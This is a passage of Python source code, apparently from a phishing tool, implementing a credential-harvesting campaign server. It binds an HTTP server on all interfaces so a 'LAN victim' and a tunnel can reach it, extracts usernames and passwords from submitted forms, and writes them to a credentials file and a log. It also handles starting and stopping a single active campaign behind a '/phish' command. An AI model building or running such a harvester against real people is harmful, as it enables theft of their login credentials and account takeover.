            def do_POST(self) -> None:  # noqa: N802
                path = urllib.parse.urlparse(self.path).path
                fields = _parse_body(self)
                campaign._hit("POST", path, fields)
                self._send(200, campaign.thanks_html)

        # Bind on all interfaces so a LAN victim (and a tunnel daemon) can
        # reach it. The printed URL stays on 127.0.0.1 because that is the
        # address the operator opens; the tunnel talks to the same port.
        httpd = ThreadingHTTPServer(("0.0.0.0", self.port), Handler)
        httpd.daemon_threads = True
        self._httpd = httpd
        t = threading.Thread(target=httpd.serve_forever, name="zim-phish", daemon=True)
        t.start()
        self._thread = t

    def _hit(self, method: str, path: str, fields: dict[str, str]) -> None:
        user, password = pick_credentials(fields) if fields else ("", "")
        event = {
            "kind": "cred" if password or (fields and user) else "hit",
            "method": method,
            "path": path,
            "fields": fields,
            "user": user,
            "password": password,
            "ts": time.time(),
        }
        with self._lock:
            self.hits.append(event)
            if event["kind"] == "cred":
                self.creds.append(event)
                self._append(self.creds_path, event)
            self._append(self.log_path, event)
        self._emit(event)

    def _append(self, path: Path, event: dict) -> None:
        try:
            with path.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(event, default=str) + "\n")
        except OSError:
            pass

    def _emit(self, event: dict) -> None:
        if self.on_event is None:
            return
        try:
            self.on_event(event)
        except Exception:
            pass

    # ---- lifecycle --------------------------------------------------------
    def stop(self) -> None:
        self.alive = False
        self.tunnel.stop()
        httpd = self._httpd
        self._httpd = None
        if httpd is not None:
            try:
                httpd.shutdown()
            except Exception:
                pass
            try:
                httpd.server_close()
            except Exception:
                pass
        self._emit({
            "kind": "stopped",
            "host": self.host,
            "hits": len(self.hits),
            "creds": len(self.creds),
            "ts": time.time(),
        })


# A module-level handle so the UI and a future `/phish stop` share one
# campaign. Only one runs at a time — a second `/phish` replaces the first.
_active: Campaign | None = None
_active_lock = threading.Lock()


def active() -> Campaign | None:
    return _active


def start(
    cfg,
    target: str,
    on_event: LogFn | None = None,
    **kwargs,
) -> Campaign:
    """Stop any running campaign, then start a new one."""
    global _active
    directory = campaign_dir(cfg, target)
    camp = Campaign(target, directory, on_event=on_event, **kwargs)
    with _active_lock:
        old = _active
        _active = camp
    if old is not None:
        try:
            old.stop()
        except Exception:
            pass
    return camp


def stop() -> Campaign | None:
    """Stop the running campaign, if any. Returns it (now dead) or None."""
    global _active
    with _active_lock:
        camp = _active
        _active = None
    if camp is not None:
        camp.stop()
    return camp
